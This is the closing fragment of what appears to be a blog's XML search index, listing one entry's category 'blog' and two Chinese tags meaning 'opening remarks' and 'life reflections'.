      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开场白 </tag>
            
            <tag> 人生感悟 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
